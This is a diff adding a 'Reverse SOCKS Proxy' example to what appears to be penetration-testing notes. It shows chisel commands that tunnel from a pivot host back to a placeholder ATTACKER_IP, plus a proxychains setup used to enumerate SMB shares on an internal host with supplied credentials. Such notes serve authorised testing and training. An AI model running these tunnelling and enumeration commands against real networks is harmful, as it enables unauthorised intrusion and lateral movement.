@@ -65,6 +65,45 @@ socks5 127.0.0.1 1080
 
 * chisel.exe works on Windows
 
+### Reverse SOCKS Proxy (Full Example)
+
+On attacker:
+
+```bash
+./chisel server -v --reverse
+# Output:
+# Reverse tunnelling enabled
+# Listening on http://0.0.0.0:8080
+```
+
+On pivot host:
+
+```bash
+./chisel client ATTACKER_IP:8080 R:socks
+# Output:
+# Connected (Latency 44ms)
+```
+
+Attacker side confirms the tunnel:
+
+```
+session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
+```
+
+Configure proxychains (`/etc/proxychains4.conf`):
+
+```
+socks5 127.0.0.1 1080
+```
+
+Now route tools through the tunnel:
+
+```bash
+proxychains nxc smb 172.16.119.10 -d DOMAIN -u user -p 'password' --shares
+```
+
+---
+
 ### Simple Port Forward / Reverse Port Forward
 
 #### Attack box
